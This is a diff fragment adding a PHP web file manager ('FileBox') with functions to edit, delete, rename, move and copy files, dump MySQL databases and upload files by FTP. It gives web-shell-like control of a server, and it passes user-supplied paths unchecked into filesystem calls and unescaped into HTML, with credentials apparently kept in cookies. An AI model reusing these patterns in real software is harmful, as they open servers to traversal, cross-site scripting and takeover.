+                if($del=='del'){
+                	if(unlink($folder.$dename)){
+                		echo $ndename." å·²ç»è¢«åˆ é™¤\n";
+                	}else{
+                		echo $ndename." åˆ é™¤å¤±è´¥ï¼\n";
+                	}
+                }
+                echo "</textarea>\n";
+                mainbottom();
+            }else{
+                printerror('æ— æ³•è§£å‹æ–‡ä»¶ï¼š'.$nfolder.$ndename);
+            }
+        }else{
+        	printerror('æ­¤æœåŠ¡å™¨ä¸Šçš„PHPä¸æ”¯æŒZipArchiveï¼Œæ— æ³•è§£å‹æ–‡ä»¶ï¼');
+        }
+    }else{
+        home();
+    }
+}
+
+
+/****************************************************************/
+/* function delete()                                            */
+/*                                                              */
+/* Second step in delete.                                       */
+/* Deletes the actual file from disk.                           */
+/* Recieves $upfile from up() as the uploaded file.             */
+/****************************************************************/
+
+function deltree($pathdir)  
+{  
+if(is_empty_dir($pathdir))//å¦‚æœæ˜¯ç©ºçš„  
+    {  
+    rmdir($pathdir);//ç›´æ¥åˆ é™¤  
+    }  
+    else  
+    {//å¦åˆ™è¯»è¿™ä¸ªç›®å½•ï¼Œé™¤äº†.å’Œ..å¤–  
+        $d=dir($pathdir);  
+        while($a=$d->read())  
+        {  
+        if(is_file($pathdir.'/'.$a) && ($a!='.') && ($a!='..')){unlink($pathdir.'/'.$a);}  
+        //å¦‚æœæ˜¯æ–‡ä»¶å°±ç›´æ¥åˆ é™¤  
+        if(is_dir($pathdir.'/'.$a) && ($a!='.') && ($a!='..'))  
+        {//å¦‚æœæ˜¯ç›®å½•  
+            if(!is_empty_dir($pathdir.'/'.$a))//æ˜¯å¦ä¸ºç©º  
+            {//å¦‚æœä¸æ˜¯ï¼Œè°ƒç”¨è‡ªèº«ï¼Œä¸è¿‡æ˜¯åŸæ¥çš„è·¯å¾„+ä»–ä¸‹çº§çš„ç›®å½•å  
+            deltree($pathdir.'/'.$a);  
+            }  
+            if(is_empty_dir($pathdir.'/'.$a))  
+            {//å¦‚æœæ˜¯ç©ºå°±ç›´æ¥åˆ é™¤  
+            rmdir($pathdir.'/'.$a);
+            }
+        }  
+        }  
+        $d->close();  
+    }  
+}  
+
+function is_empty_dir($pathdir){
+    $d=opendir($pathdir);  
+    $i=0;  
+    while($a=readdir($d)){  
+        $i++;  
+    }  
+    closedir($d);  
+    if($i>2){return false;}  
+    else return true;  
+}
+
+
+/****************************************************************/
+/* function edit()                                              */
+/*                                                              */
+/* First step in edit.                                          */
+/* Reads the file from disk and displays it to be edited.       */
+/* Recieves $upfile from up() as the uploaded file.             */
+/****************************************************************/
+
+function edit($fename) {
+    global $meurl,$folder;
+    $file = gCode($folder.$fename);
+    if (file_exists($file)) {
+        maintop("ç¼–è¾‘");
+        $contents = file_get_contents($file);
+    /*        
+    $contents = (str_replace(chr(10), chr(10).'1111', $contents));
+    $contents = (str_replace(chr(13), chr(13).'2222', $contents));    
+    $contents = (str_replace(PHP_EOL,PHP_EOL.'3333', $contents));     
+    */       
+        //$contents=PHP_EOL_re($contents,PHP_EOL);
+        if(function_exists('mb_detect_encoding'))$encode = mb_detect_encoding($contents,array('ASCII','UTF-8','GBK','GB2312'));else $encode = 'UTF-8';
+        if(htmlspecialchars($_REQUEST['encode'])){$encode = htmlspecialchars($_REQUEST['encode']);}
+        if($encode!="UTF-8" && !empty($encode))$contents = mb_convert_encoding($contents,"UTF-8",$encode);
+        foreach(mb_list_encodings() as $key => $value){
+          if($key >= 19):
+            $arr=array('EUC-CN' => 'GB2312','CP936' => 'GBK','SJIS-mac'=>'MacJapanese','SJIS-Mobile#DOCOMO'=>'SJIS-DOCOMO','SJIS-Mobile#KDDI'=>'SJIS-KDDI','SJIS-Mobile#SOFTBANK'=>'SJIS-SOFTBANK','UTF-8-Mobile#DOCOMO'=>'UTF-8-DOCOMO','UTF-8-Mobile#KDDI-B'=>'UTF-8-KDDI','UTF-8-Mobile#SOFTBANK'=>'UTF-8-SOFTBANK','ISO-2022-JP-MOBILE#KDDI'=>'ISO-2022-JP-KDDI');
+            if(array_key_exists($value, $arr)) $value_text = $arr[$value]; else $value_text = $value;
+          if($encode == $value) $list.="<option value='$value' selected>".$value_text.'</option>'; else $list.="<option value='$value'>".$value_text.'</option>';
+          endif;
+        }
+        echo "<form action='{$meurl}&op=save' method='post'><div class='title'>ç¼–è¾‘æ–‡ä»¶ {$folder}{$fename}\n"
+            ."<span class='right'><select onchange=\"javascript:window.location.href=('{$meurl}&op=edit&fename=$fename&folder=$folder&encode='+this.value);\" style=\"width:70px;height:20px;padding:0;margin:0;margin-top:-2px;font-size:12px;\">"
+            ."<option disabled>å½“å‰æ–‡ä»¶ç¼–ç </option>".$list
+            .'</select> Â» '
+            ."<select name=\"encode\" style=\"width:70px;height:20px;padding:0;margin:0;margin-top:-2px;font-size:12px;\">"
+            ."<option disabled>ä¿å­˜æ–‡ä»¶ç¼–ç </option>".$list
+            .'</select></span></div>'
+            ."<textarea rows='24' name='ncontent'>"
+            .htmlspecialchars($contents)
+            ."</textarea>"
+            ."<br>\n"
+            ."<input type='hidden' name='folder' value='{$folder}'>\n"
+            ."<input type='hidden' name='fename' value='{$fename}'>\n"
+            ."<input type='submit' value='ä¿å­˜' class='right button mob'>\n"
+            ."</form>\n";
+        mainbottom();
+    }else{
+        printerror("æ–‡ä»¶ä¸å­˜åœ¨ï¼");
+    }
+}
+
+
+/****************************************************************/
+/* function save()                                              */
+/*                                                              */
+/* Second step in edit.                                         */
+/* Recieves $ncontent from edit() as the file content.          */
+/* Recieves $fename from edit() as the file name to modify.     */
+/****************************************************************/
+
+function save($ncontent, $fename, $encode) {
+    global $meurl,$folder;
+    if (!$fename == "") {
+    $file = gCode($folder.$fename);
+    $ydata = $ncontent;
+    if($encode!=="UTF-8" && $encode!=="ASCII")$ydata = mb_convert_encoding($ydata,$encode,"UTF-8");
+    /*
+    $ydata = stripslashes(str_replace(chr(10).'1111',chr(10),  $ydata));    
+    $ydata = stripslashes(str_replace(chr(13).'2222',chr(13),  $ydata));      
+    $ydata = stripslashes(str_replace(PHP_EOL.'3333',PHP_EOL,  $ydata));  
+    */  
+    $ydata=PHP_EOL_re($ydata,PHP_EOL);
+    if(file_put_contents($file, $ydata) or $ncontent=="") {
+        maintop("ç¼–è¾‘");
+        echo "<div class='title'>æ–‡ä»¶ <a href='{$folder}{$fename}' target='_blank'>{$folder}{$fename}</a> ä¿å­˜æˆåŠŸï¼<span class='right'>$encode</span></div>\n";
+        echo "<div class='box'>è¯·é€‰æ‹© <a href='{$meurl}&op=home&folder={$_SESSION['folder']}'>è¿”å›ç›®å½•</a> æˆ–è€… <a href='{$meurl}&op=edit&fename={$fename}&folder={$folder}'>ç»§ç»­ç¼–è¾‘</a></div>\n";
+        $fp = null;
+        mainbottom();
+    }else{
+        printerror("æ–‡ä»¶ä¿å­˜å‡ºé”™ï¼");
+    }
+    }else{
+    home();
+    }
+}
+
+/****************************************************************/
+/* function cr()                                                */
+/*                                                              */
+/* First step in create.                                        */
+/* Promts the user to a filename and file/directory switch.     */
+/****************************************************************/
+
+function cr() {
+    global $meurl, $folder;
+    maintop("åˆ›å»º");
+    echo "<form action='{$meurl}&op=create' method='post'>\n"
+        ."<div class='title'>åˆ›å»ºæ–‡ä»¶ æˆ– ç›®å½• <span class='right'><select name='isfolder' style='width:100px;height:20px;padding:0;margin:0;margin-top:-2px;font-size:12px;'><option value='0'>æ–‡ä»¶ File</option>\n"
+        ."<option value='1'>æ–‡ä»¶å¤¹ Dir</option></select></span></div><div class='box' style='border-bottom:none'><label for='nfname'>æ–‡ä»¶åï¼š</label><input type='text' size='20' id='nfname' placeholder='è¯·è¾“å…¥æ–‡ä»¶åâ€¦â€¦' name='nfname' class='text long'>\n"
+        ."</div><input type='text' class='text' id='ndir' style='width:calc(100% - 12px);margin:0;' name='ndir' placeholder='ç›®æ ‡ç›®å½•â€¦â€¦' value='".$_SESSION['folder']."'>";
+
+    echo "<input type='hidden' name='folder' value='$folder'>\n"
+        ."<input type='submit' value='åˆ›å»º' class='right button mob'>\n"
+        ."</form>\n";
+    mainbottom();
+}
+
+
+/****************************************************************/
+/* function create()                                            */
+/*                                                              */
+/* Second step in create.                                       */
+/* Creates the file/directoy on disk.                           */
+/* Recieves $nfname from cr() as the filename.                  */
+/* Recieves $infolder from cr() to determine file trpe.         */
+/****************************************************************/
+
+function create($nfname, $isfolder, $ndir) {
+    global $meurl, $folder;
+    if (!$nfname == "") {
+        $ndir = gCode($ndir);
+        $nfname = gCode($nfname);
+    if ($isfolder == 1) {
+        if(mkdir($ndir."/".$nfname, 0755)) {
+        	$ndir = uCode($ndir);
+        	$nfname = uCode($nfname);
+          maintop("åˆ›å»º");
+            echo "<div class='title'>æ‚¨çš„ç›®å½•<a href='{$meurl}&op=home&folder=./".$nfname."/'>".$ndir.$nfname."/</a> å·²ç»æˆåŠŸè¢«åˆ›å»ºã€‚</div><div class='box'>\n"
+            ."è¯·é€‰æ‹© <a href='{$meurl}&op=home&folder=".$ndir.$nfname."/'>æ‰“å¼€æ–‡ä»¶å¤¹</a> æˆ–è€… <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a>\n";
+          echo "</div>";
+          mainbottom();
+        }else{
+        	$ndir = uCode($ndir);
+        	$nfname = uCode($nfname);
+            printerror("æ‚¨çš„ç›®å½• ".$ndir.$nfname." ä¸èƒ½è¢«åˆ›å»ºã€‚è¯·æ£€æŸ¥æ‚¨çš„ç›®å½•æƒé™æ˜¯å¦å·²ç»è¢«è®¾ç½®ä¸ºå¯å†™ æˆ–è€… ç›®å½•æ˜¯å¦å·²ç»å­˜åœ¨</span>\n");
+        }
+    }else{
+        if(fopen($ndir."/".$nfname, "w")) {
+        	$ndir = uCode($ndir);
+        	$nfname = uCode($nfname);
+          maintop("åˆ›å»º");
+            echo "<div class='title'>æ‚¨çš„æ–‡ä»¶, <a href='{$meurl}&op=viewframe&file=".$nfname."&folder=$ndir'>".$ndir.$nfname."</a> å·²ç»æˆåŠŸè¢«åˆ›å»º</div><div class='box'>\n"
+                ."<a href='{$meurl}&op=edit&fename=".$nfname."&folder=".$ndir."'>ç¼–è¾‘æ–‡ä»¶</a> æˆ–è€…æ˜¯ <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a>\n";
+          echo "</div>";
+          mainbottom();
+        }else{
+        	$ndir = uCode($ndir);
+        	$nfname = uCode($nfname);
+            printerror("æ‚¨çš„æ–‡ä»¶ ".$ndir.$nfname." ä¸èƒ½è¢«åˆ›å»ºã€‚è¯·æ£€æŸ¥æ‚¨çš„ç›®å½•æƒé™æ˜¯å¦å·²ç»è¢«è®¾ç½®ä¸ºå¯å†™ æˆ–è€… æ–‡ä»¶æ˜¯å¦å·²ç»å­˜åœ¨</span>\n");
+        }
+    }
+    }else{
+    cr();
+    }
+}
+
+
+/****************************************************************/
+/* function ren()                                               */
+/*                                                              */
+/* First step in rename.                                        */
+/* Promts the user for new filename.                            */
+/* Globals $file and $folder for filename.                      */
+/****************************************************************/
+
+function ren($file) {
+    global $meurl,$folder,$ufolder;
+    $ufile = $file;
+    if (!$file == "") {
+        maintop("é‡å‘½å");
+        echo "<form action='{$meurl}&op=rename' method='post'>\n"
+            ."<div class='title'>é‡å‘½å ".$ufolder.$ufile.'</div>';
+        echo "<input type='hidden' name='rename' value='".$ufile."'>\n"
+            ."<input type='hidden' name='folder' value='".$ufolder."'>\n"
+            ."<input class='text' type='text' style='width:calc(100% - 12px);margin:0;' placeholder='è¯·è¾“å…¥æ–‡ä»¶åâ€¦â€¦' name='nrename' value='$ufile'>\n"
+            ."<input type='Submit' value='é‡å‘½å' class='right button mob'></form>\n";
+        mainbottom();
+    }else{
+        home();
+    }
+}
+
+
+/****************************************************************/
+/* function renam()                                             */
+/*                                                              */
+/* Second step in rename.                                       */
+/* Rename the specified file.                                   */
+/* Recieves $rename from ren() as the old  filename.            */
+/* Recieves $nrename from ren() as the new filename.            */
+/****************************************************************/
+
+function renam($rename, $nrename, $folder) {
+    global $meurl,$folder;
+    if (!$rename == "") {
+        $loc1 = gCode("$folder".$rename); 
+        $loc2 = gCode("$folder".$nrename);
+        if(rename($loc1,$loc2)) {
+        	maintop("é‡å‘½å");
+            echo "<div class='title'>æ–‡ä»¶ ".$folder.$rename." å·²è¢«é‡å‘½åæˆ ".$folder.$nrename."</a></div>\n"
+            ."<div class='box'>è¯·é€‰æ‹© <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a> æˆ–è€… <a href='&op=edit&fename={$nrename}&folder={$folder}'>ç¼–è¾‘æ–°æ–‡ä»¶</a></div>\n";
+            mainbottom();
+        }else{
+            printerror("é‡å‘½åå‡ºé”™ï¼");
+        }
+    }else{
+    home();
+    }
+}
+
+/****************************************************************/
+/* function movall                                              */
+/*                                                              */
+/* æ‰¹é‡ç§»åŠ¨ 2014-4-12 by jooies                                 */
+/****************************************************************/
+
+function movall($file, $ndir, $folder) {
+    global $meurl,$folder;
+    if (!$file == "") {
+        maintop("æ‰¹é‡ç§»åŠ¨");
+        $arr = str_split($ndir);
+        if($arr[count($arr)-1]!=='/'){
+            $ndir .= '/';
+        }
+        $nndir = $ndir;
+        $nfolder = $folder;
+    	$file = gCode($file);
+    	$ndir = gCode($ndir);
+    	$folder = gCode($folder);
+        if (!file_exists($ndir)){
+    	    mkdir($ndir, 0755);
+        }
+        $file = explode(',',$file);
+      echo "<div class='title'>æ‚¨å¯ä»¥ <a href='{$meurl}&op=home&folder={$nndir}'>å‰å¾€æ–‡ä»¶å¤¹æŸ¥çœ‹æ–‡ä»¶</a> æˆ–è€… <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a></div><textarea rows=20 disabled>";
+        foreach ($file as $v) {
+        if (file_exists($ndir.$v)){
+        	if (rename($folder.$v, $ndir.$v."(1)")){
+        		$v = uCode($v);
+    	       echo $nndir.$v." æ–‡ä»¶å·²å­˜åœ¨ï¼Œè‡ªåŠ¨æ›´åä¸º {$nndir}(1)\n";
+            }else{
+            	$v = uCode($v);
+              echo "æ— æ³•ç§»åŠ¨ ".$nfolder.$v."ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æƒé™\n";
+            }
+        }elseif (rename($folder.$v, $ndir.$v)){
+        	$v = uCode($v);
+            echo $nfolder.$v." å·²ç»æˆåŠŸç§»åŠ¨åˆ° ".$nndir.$v."\n";
+        }else{
+        	$v = uCode($v);
+            echo "æ— æ³•ç§»åŠ¨ ".$nfolder.$v."ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æƒé™æˆ–æ–‡ä»¶æ˜¯å¦å­˜åœ¨\n";
+        }
+        }
+    echo "</textarea>";
+    mainbottom();
+    }else{
+    home();
+    }
+}
+
+/****************************************************************/
+/* function tocopy                                              */
+/*                                                              */
+/* æ‰¹é‡å¤åˆ¶ 2014-4-19 by jooies                                 */
+/****************************************************************/
+
+function tocopy($file, $ndir, $folder) {
+    global $meurl,$folder;
+    if (!$file == "") {
+        maintop("å¤åˆ¶");
+        $nndir = $ndir;
+        $nfolder = $folder;
+    	  $file = gCode($file);
+    	  $ndir = gCode($ndir);
+    	  $folder = gCode($folder);
+        if (!file_exists($ndir)){
+    	    mkdir($ndir, 0755);
+        }
+        $file = explode(',',$file);
+        echo "<div class='box'>æ‚¨å¯ä»¥ <a href='{$meurl}&op=home&folder=".$nndir."'>å‰å¾€æ–‡ä»¶å¤¹æŸ¥çœ‹æ–‡ä»¶</a> æˆ–è€… <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a></div><textarea rows=20 disabled>";
+        foreach ($file as $v) {
+        if (file_exists($ndir.$v)){
+        	if (copy($folder.$v, $ndir.$v.'(1)')){
+        		  $v = iconv("GBK", "UTF-8",$v);
+    	        echo "{$nndir}{$v} æ–‡ä»¶å·²å­˜åœ¨ï¼Œè‡ªåŠ¨æ›´åä¸º {$nfolder}{$v}(1)\n";
+            }else{
+            	$v = iconv("GBK", "UTF-8",$v);
+              echo "æ— æ³•å¤åˆ¶ {$nfolder}{$v}ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æƒé™\n";
+            }
+        }elseif (copy($folder.$v, $ndir.$v)){
+        	$v = iconv("GBK", "UTF-8",$v);
+            echo $nfolder.$v." å·²ç»æˆåŠŸå¤åˆ¶åˆ° ".$nndir.$v."\n";
+        }else{
+        	$v = iconv("GBK", "UTF-8",$v);
+            echo "æ— æ³•å¤åˆ¶ ".$nfolder.$v."ï¼Œè¯·æ£€æŸ¥æ–‡ä»¶æƒé™\n";
+        }
+        }
+    echo "</textarea>";
+    mainbottom();
+    }else{
+    home();
+    }
+}
+
+
+/****************************************************************/
+/* function logout()                                            */
+/*                                                              */
+/* Logs the user out and kills cookies                          */
+/****************************************************************/
+
+function logout() {
+    global $meurl;
+    setcookie("user","",time()-60*60*24*1);
+    setcookie("pass","",time()-60*60*24*1);
+
+    maintop("æ³¨é”€",false);
+    echo "<div class='box'>æ³¨é”€æˆåŠŸï¼<br>"
+        ."<a href={$meurl}&op=home>ç‚¹å‡»è¿™é‡Œé‡æ–°ç™»å½•</a></dvi>";
+    mainbottom();
+}
+
+
+/****************************************************************/
+/* function mainbottom()                                        */
+/*                                                              */
+/* é¡µé¢åº•éƒ¨çš„ç‰ˆæƒå£°æ˜                                           */
+/****************************************************************/
+
+function mainbottom() {
+    echo "</div><div style='text-align:center;font-size:13px;color:#999 !important;margin:10px 0 45px 0;font-family:Candara;'>"
+        ."FileBox Version 1.10.0.2</div></body>\n"
+        ."</html>\n";
+    exit;
+}
+
+
+/****************************************************************/
+/* function sqlb()                                              */
+/*                                                              */
+/* First step to backup sql.                                    */
+/****************************************************************/
+
+function sqlb() {
+	global $meurl;
+    maintop("æ•°æ®åº“å¤‡ä»½");
+    echo "<div class='title'><span>è¿™å°†è¿›è¡Œæ•°æ®åº“å¯¼å‡ºå¹¶å‹ç¼©æˆmysql.zipçš„åŠ¨ä½œ! å¦‚å­˜åœ¨è¯¥æ–‡ä»¶,è¯¥æ–‡ä»¶å°†è¢«è¦†ç›–ï¼</span></div><div class='box'><form action='{$meurl}&op=sqlbackup' method='POST'>\n<label for='ip'>æ•°æ®åº“åœ°å€:  </label><input type='text' id='ip' name='ip' size='30' value='localhost' class='text'/><br><label for='sql'>æ•°æ®åº“åç§°:  </label><input type='text' id='sql' name='sql' size='30' class='text'/><br><label for='username'>æ•°æ®åº“ç”¨æˆ·:  </label><input type='text' id='username' name='username' size='30' value='root' class='text'/><br><label for='password'>æ•°æ®åº“å¯†ç :  </label><input type='password' id='password' name='password' size='30' class='text'/><br></div><input name='submit' class='right button mob' value='å¤‡ä»½' type='submit' /></form>\n";
+    mainbottom();
+}
+
+
+/****************************************************************/
+/* function sqlbackup()                                         */
+/*                                                              */
+/* Second step in backup sql.                                   */
+/****************************************************************/
+
+function sqlbackup($ip="localhost",$sql,$username="root",$password) {
+	global $meurl;
+    if(class_exists('ZipArchive')){
+    $database=$sql;//æ•°æ®åº“å
+    $options=array(
+        'hostname' => $ip,//ipåœ°å€
+        'charset' => 'utf8',//ç¼–ç 
+        'filename' => $database.'.sql',//æ–‡ä»¶å
+        'username' => $username,
+        'password' => $password
+    );
+    $mysql = mysqli_connect($options['hostname'],$options['username'],$options['password'],$database)or die(printerror("ä¸èƒ½è¿æ¥æ•°æ®åº“ï¼š".mysqli_connect_error()));
+    maintop("MySQLå¤‡ä»½");
+    mysqli_query($mysql,"SET NAMES '{$options['charset']}'");
+    $tables = list_tables($database,$mysql);
+    $filename = sprintf($options['filename'],$database);
+    $fp = fopen($filename, 'w');
+    foreach ($tables as $table) {
+        dump_table($table, $fp,$mysql);
+    }
+    fclose($fp);
+    mysqli_close($mysql);
+    //å‹ç¼©sqlæ–‡ä»¶
+        if (file_exists('mysql.zip')) {
+            unlink('mysql.zip'); 
+        }
+        $file_name=$options['filename'];
+        $zip = new ZipArchive;
+        $res = $zip->open('mysql.zip', ZipArchive::CREATE);
+        if ($res === TRUE) {
+            $zip->addfile($file_name);
+            $zip->close();
+        //åˆ é™¤æœåŠ¡å™¨ä¸Šçš„sqlæ–‡ä»¶
+            unlink($file_name);
+        echo '<div class="box">æ•°æ®åº“å¯¼å‡ºå¹¶å‹ç¼©å®Œæˆï¼'
+            ." <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a></div>\n";
+        }else{
+            printerror('æ— æ³•å‹ç¼©æ–‡ä»¶ï¼');
+        }
+    exit;
+    mainbottom();
+    }else{
+    	printerror('æ­¤æœåŠ¡å™¨ä¸Šçš„PHPä¸æ”¯æŒZipArchiveï¼Œæ— æ³•å‹ç¼©æ–‡ä»¶ï¼');
+    }
+}
+
+function list_tables($database,$mysql)
+{
+    $rs = mysqli_query($mysql,"SHOW TABLES FROM $database");
+    $tables = array();
+    while ($row = mysqli_fetch_row($rs)) {
+        $tables[] = $row[0];
+    }
+    mysqli_free_result($rs);
+    return $tables;
+}
+
+//å¯¼å‡ºæ•°æ®åº“
+function dump_table($table, $fp = null,$mysql)
+{
+    $need_close = false;
+    if (is_null($fp)) {
+        $fp = fopen($table . '.sql', 'w');
+        $need_close = true;
+    }
+$a=mysqli_query($mysql,"show create table `{$table}`");
+$row=mysqli_fetch_assoc($a);fwrite($fp,$row['Create Table'].';');//å¯¼å‡ºè¡¨ç»“æ„
+    $rs = mysqli_query($mysql,"SELECT * FROM `{$table}`");
+    while ($row = mysqli_fetch_row($rs)) {
+        fwrite($fp, get_insert_sql($table, $row));
+    }
+    mysqli_free_result($rs);
+    if ($need_close) {
+        fclose($fp);
+    }
+}
+
+//å¯¼å‡ºè¡¨æ•°æ®
+function get_insert_sql($table, $row)
+{
+    $sql = "INSERT INTO `{$table}` VALUES (";
+    $values = array();
+    foreach ($row as $value) {
+        $values[] = "'" . mysql_real_escape_string($value) . "'";
+    }
+    $sql .= implode(', ', $values) . ");";
+    return $sql;
+}
+
+/****************************************************************/
+/* function ftpa()                                              */
+/*                                                              */
+/* First step to backup sql.                                    */
+/****************************************************************/
+
+function ftpa() {
+	global $meurl;
+    maintop("FTPå¤‡ä»½");
+    echo "<div class='title'>è¿™å°†æŠŠæ–‡ä»¶è¿œç¨‹ä¸Šä¼ åˆ°å…¶ä»–ftpï¼å¦‚ç›®å½•å­˜åœ¨è¯¥æ–‡ä»¶,æ–‡ä»¶å°†è¢«è¦†ç›–ï¼</div>\n<form action='{$meurl}&op=ftpall' method='POST'><div class='box'><label for='ftpip'>FTP åœ°å€ï¼š</label><input type='text' id='ftpip' name='ftpip' size='30' class='text' value='127.0.0.1:21'/><br><label for='ftpuser'>FTP ç”¨æˆ·ï¼š</label><input type='text' id='ftpuser' name='ftpuser' size='30' class='text'/><br><label for='ftppass'>FTP å¯†ç ï¼š</label><input type='password' id='ftppass' name='ftppass' size='30' class='text'/><br><label type='text' for='goto'>ä¸Šä¼ ç›®å½•ï¼š</label><input type='text' id='goto' name='goto' size='30' class='text' value='./htdocs/'/><br><label for='ftpfile'>ä¸Šä¼ æ–‡ä»¶ï¼š</label><input type='text' id='ftpfile' name='ftpfile' size='30' class='text' value='allbackup.zip'/></div><div class='right'><label for='del'><input type='checkbox' name='del' id='del'value='checkbox'><abbr title='FTPä¸Šä¼ ååˆ é™¤æœ¬åœ°æ–‡ä»¶'>åˆ é™¤</abbr></label> <input name='submit' class='button' value='è¿œç¨‹ä¸Šä¼ ' type='submit' /></div></form>\n";
+    mainbottom();
+}
+
+/****************************************************************/
+/* function ftpall()                                         */
+/*                                                              */
+/* Second step in backup sql.                                   */
+/****************************************************************/
+
+function ftpall($ftpip,$ftpuser,$ftppass,$ftpdir,$ftpfile,$del) {
+	global $meurl;
+	$ftpfile = gCode($ftpfile);
+    $ftpip=explode(':', $ftpip);
+    $ftp_server=$ftpip['0'];//æœåŠ¡å™¨
+    $ftp_user_name=$ftpuser;//ç”¨æˆ·å
+    $ftp_user_pass=$ftppass;//å¯†ç 
+    if(empty($ftpip['1'])){
+    	$ftp_port='21';
+    }else{
+    	$ftp_port=$ftpip['1'];//ç«¯å£
+    }
+    $ftp_put_dir=$ftpdir;//ä¸Šä¼ ç›®å½•
+    $ffile=$ftpfile;//ä¸Šä¼ æ–‡ä»¶
+
+    $ftp_conn_id = ftp_connect($ftp_server,$ftp_port);
+    $ftp_login_result = ftp_login($ftp_conn_id, $ftp_user_name, $ftp_user_pass);
+
+    if((!$ftp_conn_id) || (!$ftp_login_result)) {
+        printerror('è¿æ¥åˆ°ftpæœåŠ¡å™¨å¤±è´¥');
+        exit;
+    }else{
+        ftp_pasv ($ftp_conn_id,true); //è¿”å›ä¸€ä¸‹æ¨¡å¼ï¼Œè¿™å¥å¾ˆå¥‡æ€ªï¼Œæœ‰äº›ftpæœåŠ¡å™¨ä¸€å®šéœ€è¦æ‰§è¡Œè¿™å¥
+        ftp_chdir($ftp_conn_id, $ftp_put_dir);
+        $ffile=explode(',', $ffile);
+        foreach ($ffile as $v) {
+        	$ftp_upload = ftp_put($ftp_conn_id,$v,$v, FTP_BINARY);
+        	if ($del == 'del') {
+        		unlink('./'.$v);
+        	}
+        }
+        ftp_close($ftp_conn_id); //æ–­å¼€
+    }
+    maintop("FTPä¸Šä¼ ");
+    echo "<div class='title'>";
+    $ftpfile = uCode($ftpfile);
+    echo "æ–‡ä»¶ ".$ftpfile." ä¸Šä¼ æˆåŠŸ</div><div class='box'>\n"
+        ." <a href='{$meurl}&op=home&folder=".$_SESSION['folder']."'>è¿”å›ç›®å½•</a>\n";
+    echo "</div>";
+    mainbottom();
+}
+
+
+/****************************************************************/
+/* function printerror()                                        */
+/*                                                              */
+/* ç”¨äºæ˜¾ç¤ºé”™è¯¯ä¿¡æ¯çš„å‡½æ•°                                       */
+/* $errorä¸ºæ˜¾ç¤ºçš„æç¤º                                           */
+/****************************************************************/
+
+function printerror($error) {
+    maintop("é”™è¯¯");
+    echo "<div class='title'>é”™è¯¯ä¿¡æ¯å¦‚ä¸‹ï¼š</div><div class='box'><span class='error' style='font-size:12px;'>\n".$error."\n</span> <a onclick='history.go(-1);' style='cursor:pointer;font-size:12px;'>è¿”å›ä¸Šä¸€æ­¥</a></div>";
+    mainbottom();
+}
+
+/****************************************************************/
+/* function deleteall()                                         */
+/*                                                              */
+/* 2014-3-9 Add by Jooies                                       */
+/* å®ç°æ–‡ä»¶çš„æ‰¹é‡åˆ é™¤åŠŸèƒ½                                       */
+/****************************************************************/
+
+function deleteall($dename) {
+    if (!$dename == "") {
+    	$udename = $dename;
+    	$dename = gCode($dename);
+        if (is_dir($dename)) {
+            if(is_empty_dir($dename)){ 
+                rmdir($dename);
+                echo $udename." å·²ç»è¢«åˆ é™¤\n";
+            }else{
+                deltree($dename);
+                rmdir($dename);
+                echo $udename." å·²ç»è¢«åˆ é™¤\n";
+            }
+        }else{
+            if(unlink($dename)) {
+                echo $udename." å·²ç»è¢«åˆ é™¤\n";
+            }else{
+                echo("æ— æ³•åˆ é™¤æ–‡ä»¶ï¼š$udename ã€‚\nå‚è€ƒä¿¡æ¯\n1.æ–‡ä»¶ä¸å­˜åœ¨\n2.æ–‡ä»¶æ­£åœ¨æ‰§è¡Œ\n");
+            }
+        }
+    }
+}
+
+/****************************************************************/
+/* function maintop()                                           */
+/*                                                              */
+/* æ§åˆ¶ç«™ç‚¹çš„æ ·å¼å’Œå¤´éƒ¨å†…å®¹                                     */
+/* $title -> é¡¶éƒ¨æ ‡é¢˜ $showtop -> æ˜¯å¦æ˜¾ç¤ºå¤´éƒ¨èœå•              */
+/****************************************************************/
+
+function maintop($title,$showtop = true) {
+    global $meurl,$sitetitle,$op;
+    echo "<!DOCTYPE html>\n<meta name='robots' content='noindex,follow' />\n<head>\n<meta name='viewport' content='width=device-width, initial-scale=1'/>\n"
+        ."<title>$sitetitle - $title</title>\n"
+        ."</head>\n"
+        ."<body>\n"
+        ."<style>\n*{font-family:'Verdana','Microsoft Yahei';}.box{border:1px solid #ccc;background-color:#fff;padding:10px;}abbr{text-decoration:none;}.title{border:1px solid #ccc;border-bottom:0;font-weight:normal;text-align:left;width:678px;padding:10px;font-size:12px;color:#666;background-color:#F0F0F0;}.right{float:right;text-align:right !important;}.content{width:700px;margin:auto;overflow:hidden;font-size:13px;}.login_button{height:43px;line-height:18px;font-family:'Candara';}.login_text{font-family:'Candara','Microsoft Yahei';vertical-align:middle;padding:7px;width:40%;font-size:22px;border:1px #ccc solid;}input[type=text]:focus,input[type=password]:hover{outline:0;background-color:#f8f8f8;}input[type=text]:hover,input[type=password]:hover,input[type=password]:active{outline:0;background-color:#f8f8f8;}h2{color:#514f51;text-align:center;margin:16px 0;font-size:48px;background-image: -webkit-gradient(linear, 0 0, 0 bottom, from(#7d7d7d), to(#514f51));-webkit-background-clip: text;background-clip: text;-webkit-text-fill-color: transparent;font-family:'Candara','Lucida Sans','Microsoft Yahei' !important;}span{margin-bottom:8px;}a:visited{color:#333;text-decoration:none;}a:hover{color:#999;text-decoration:none;}a{color:#333;text-decoration:none;border-bottom:1px solid #CCC;}a:active{color:#999;text-decoration:none;}.title a,td a,.menu a{border:0}textarea{outline:none;font-family:'Yahei Consolas Hybrid',Consolas,Verdana,Tahoma,Arial,Helvetica,'Microsoft Yahei',sans-serif !important;font-size:13px;border:1px solid #ccc;margin-top:-1px;padding:8px;line-height:18px;width:682px;max-width:682px;}input.button{background-color:#eeeeee;text-align:center !important;outline:none;border:1px solid #adadad;*display:inline;color:#000;padding:3px 18px;font-size:13px;margin-top:10px;transition: border-color 0.5s;}input.button:hover{background-color:#e5f1fb;border-color:#0078d7;}input.mob{padding:3px 